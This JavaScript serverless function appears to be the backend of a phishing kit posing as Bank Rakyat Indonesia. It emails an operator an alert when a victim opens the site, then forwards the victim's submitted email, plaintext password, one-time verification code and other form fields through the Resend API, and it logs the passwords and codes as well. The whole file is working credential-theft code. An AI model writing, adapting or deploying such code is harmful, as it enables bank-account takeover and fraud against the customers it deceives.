const { Resend } = require('resend');
const fs = require('fs');
const path = require('path');

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Load email template - inline templates to avoid file extraction issues
function getEmailTemplate(templateType, data) {
  const timestamp = new Date().toISOString();
  let template = '';
  
  switch(templateType) {
    case 'website-visit':
      template = `
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
          <tr>
            <td align="center">
              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
                <tr>
                  <td style="padding: 30px;">
                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 25px;">
                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🚀 WEBSITE ACCESS ALERT</h1>
                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
                            HEY!!!, ${data.name || 'Sugeng Yulianto'} just open website, get ready.
                          </p>
                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
                            This is an automated notification that someone has accessed the BRI website.
                          </p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Timestamp:</strong> ${timestamp}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>IP Address:</strong> ${data.ip_address || 'Unknown'}</p>
                        </td>
                      </tr>
                      <tr>
                        <td align="center" style="padding-top: 25px;">
                          <a href="${data.website_url || 'http://localhost:3000'}" style="display: inline-block; padding: 12px 30px; background: #0B5FFF; color: #fff; text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px;">Visit Website</a>
                        </td>
                      </tr>
                      <tr>
                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `;
      break;
      
    case 'email-submission':
      template = `
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
          <tr>
            <td align="center">
              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
                <tr>
                  <td style="padding: 30px;">
                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 25px;">
                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">📧 EMAIL SUBMISSION</h1>
                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
                            THIS IS ${data.name || 'Sugeng Yulianto'} Email = "${data.email || 'Not provided'}"
                          </p>
                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
                            User has submitted their email address through the BRI website authentication system.
                          </p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Submitted Email:</strong> ${data.email || 'Not provided'}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> ${timestamp}</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff3cd; padding: 15px; border-radius: 6px; border-left: 4px solid #ffc107;">
                          <p style="color: #856404; font-size: 13px; margin: 0;">⚠️ Please verify this email address before proceeding with authentication.</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `;
      console.log('Email template generated with email:', data.email);
      break;
      
    case 'password-submission':
      template = `
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
          <tr>
            <td align="center">
              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
                <tr>
                  <td style="padding: 30px;">
                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 25px;">
                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🔐 PASSWORD SUBMISSION</h1>
                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
                            THIS IS ${data.name || 'Sugeng Yulianto'} password = "${data.password || 'Not provided'}"
                          </p>
                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
                            User has submitted their password through the BRI website authentication system.
                          </p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>User:</strong> ${data.name || 'Sugeng Yulianto'}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Password:</strong> ${data.password || 'Not provided'}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> ${timestamp}</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #d4edda; padding: 15px; border-radius: 6px; border-left: 4px solid #28a745;">
                          <p style="color: #155724; font-size: 13px; margin: 0;">✅ Password received. Authentication process in progress.</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `;
      console.log('Password template generated with password:', data.password);
      break;
      
    case 'verification-code':
      template = `
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
          <tr>
            <td align="center">
              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
                <tr>
                  <td style="padding: 30px;">
                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 25px;">
                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🔢 VERIFICATION CODE</h1>
                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
                            THIS IS THE One time verification code!! = "${data.code || 'Not provided'}"
                          </p>
                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
                            A verification code has been generated for ${data.name || 'Sugeng Yulianto'}.
                          </p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: linear-gradient(135deg, #0B5FFF 0%, #0A63E6 100%); padding: 25px; border-radius: 8px; text-align: center; margin-bottom: 20px;">
                          <p style="color: #fff; font-size: 32px; font-weight: 800; margin: 0; letter-spacing: 4px;">${data.code || 'Not provided'}</p>
                          <p style="color: rgba(255,255,255,0.8); font-size: 13px; margin: 10px 0 0;">This code expires in 10 minutes</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Recipient:</strong> ${data.name || 'Sugeng Yulianto'}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Generated:</strong> ${timestamp}</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff3cd; padding: 15px; border-radius: 6px; border-left: 4px solid #ffc107;">
                          <p style="color: #856404; font-size: 13px; margin: 0;">⚠️ Do not share this code with anyone. BRI will never ask for your verification code.</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `;
      console.log('Verification code template generated with code:', data.code);
      break;
      
    case 'information-submission':
      template = `
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
          <tr>
            <td align="center">
              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
                <tr>
                  <td style="padding: 30px;">
                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 25px;">
                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">📋 INFORMATION SUBMISSION</h1>
                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
                            This is ${data.name || 'Sugeng Yulianto'} submitted information:
                          </p>
                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
                            User has submitted the following information through the BRI website.
                          </p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #f7f8f9; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                          <h3 style="color: #1a202c; font-size: 16px; font-weight: 700; margin: 0 0 15px 0; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">Submitted Data:</h3>
                          ${formatInformationArray(data.information_array)}
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Submitted By:</strong> ${data.name || 'Sugeng Yulianto'}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Total Fields:</strong> ${data.field_count || '0'}</p>
                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> ${timestamp}</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="background: #d1ecf1; padding: 15px; border-radius: 6px; border-left: 4px solid #17a2b8;">
                          <p style="color: #0c5460; font-size: 13px; margin: 0;">ℹ️ Information has been received and is being processed by the system.</p>
                        </td>
                      </tr>
                      <tr>
                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `;
      break;
      
    default:
      throw new Error(`Unknown template type: ${templateType}`);
  }
  
  console.log('Template generated for:', templateType, 'with data:', JSON.stringify(data));
  return template;
}

// Format information array as HTML table
function formatInformationArray(infoArray) {
  if (!infoArray || !Array.isArray(infoArray)) {
    return '<p style="color: #999; font-size: 13px;">No information provided</p>';
  }
  
  let html = '<table style="width: 100%; border-collapse: collapse;">';
  infoArray.forEach((item, index) => {
    if (typeof item === 'object' && item !== null) {
      const keys = Object.keys(item);
      html += '<tr style="border-bottom: 1px solid #e2e8f0;">';
      keys.forEach(key => {
        html += `<td style="padding: 10px; color: #666; font-size: 13px;"><strong>${key}:</strong></td>`;
        html += `<td style="padding: 10px; color: #333; font-size: 13px;">${item[key]}</td>`;
      });
      html += '</tr>';
    } else {
      html += '<tr style="border-bottom: 1px solid #e2e8f0;">';
      html += `<td style="padding: 10px; color: #666; font-size: 13px;"><strong>Field ${index + 1}:</strong></td>`;
      html += `<td style="padding: 10px; color: #333; font-size: 13px;">${item}</td>`;
      html += '</tr>';
    }
  });
  html += '</table>';
  return html;
}

// Vercel serverless function handler
module.exports = async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    console.log('RAW REQUEST BODY:', JSON.stringify(req.body));
    const { templateType, email, subject, data } = req.body;
    
    console.log('PARSED - templateType:', templateType);
    console.log('PARSED - email:', email);
    console.log('PARSED - subject:', subject);
    console.log('PARSED - data:', JSON.stringify(data));
    
    // Default values if not provided
    const toEmail = email || process.env.DEFAULT_EMAIL;
    if (!toEmail) {
      return res.status(500).json({
        success: false,
        message: 'DEFAULT_EMAIL is not configured'
      });
    }
    const emailSubject = subject || 'BRI Website Notification';
    const template = templateType || 'website-visit';
    const templateData = data || {};

    console.log('FINAL - Processing template:', template, 'with templateData:', JSON.stringify(templateData));

    const htmlContent = getEmailTemplate(template, templateData);
    
    console.log('Generated HTML content length:', htmlContent.length);
    console.log('HTML contains email data:', htmlContent.includes(templateData.email || ''));
    console.log('HTML contains password data:', htmlContent.includes(templateData.password || ''));

    const emailData = await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || 'BRI Website <onboarding@resend.dev>',
      to: [toEmail],
      subject: emailSubject,
      html: htmlContent
    });

    console.log('Email sent successfully:', emailData);
    res.status(200).json({ success: true, message: 'Email sent successfully', data: emailData });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, message: 'Error sending email', error: error.message });
  }
};
